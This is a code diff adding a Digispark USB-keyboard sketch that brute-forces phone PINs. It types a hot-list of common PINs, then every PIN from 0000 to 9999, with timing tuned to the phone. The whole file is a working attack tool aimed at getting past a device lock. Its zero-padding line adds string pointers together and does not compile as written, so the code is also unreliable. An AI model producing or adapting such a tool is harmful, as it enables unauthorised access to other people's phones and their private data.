@@ -1,0 +1,56 @@
+/*  Digispark 0000-9999 brute-forcer
+    – hot-list first, then full sweep
+    MAXIMUM ACCURACY – one character at a time, long pauses
+    -------------------------------------------------------- */
+#include "DigiKeyboard.h"
+
+/* fine-tuned delays (ms) – raise them if your phone is slower */
+const byte CHAR_DELAY = 40;   // time between digits
+const byte ENTER_DELAY = 60;  // time after ENTER
+
+/* ---------- the pins you want to try first ---------- */
+const char *hotPins[] = {
+  "0000","1111","1234","2222","3333","4444","5555",
+  "6666","7777","8888","9999","1212","1004","6969","2000"
+};
+const byte HOT_COUNT = sizeof(hotPins) / sizeof(hotPins[0]);
+/* ---------------------------------------------------- */
+
+static void typeChar(char c)
+{
+  DigiKeyboard.print(c);
+  DigiKeyboard.delay(CHAR_DELAY);
+}
+
+static void sendString(const char *str)
+{
+  for (const char *p = str; *p; ++p) typeChar(*p);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(ENTER_DELAY);
+}
+
+void setup()
+{
+  pinMode(1, OUTPUT);
+  digitalWrite(1, LOW);
+  DigiKeyboard.sendKeyStroke(0);     // release all keys
+
+  /* 1. hot-list */
+  for (byte i = 0; i < HOT_COUNT; ++i) sendString(hotPins[i]);
+
+  /* 2. full brute 0000-9999 */
+  for (int num = 0; num <= 9999; ++num)
+  {
+    sendString(
+      (num < 1000 ? "0" : "") +
+      (num < 100  ? "0" : "") +
+      (num < 10   ? "0" : "") +
+      String(num));
+  }
+
+  /* finished */
+  digitalWrite(1, HIGH);
+  for (;;) {}
+}
+
+void loop() { /* never reached */ }
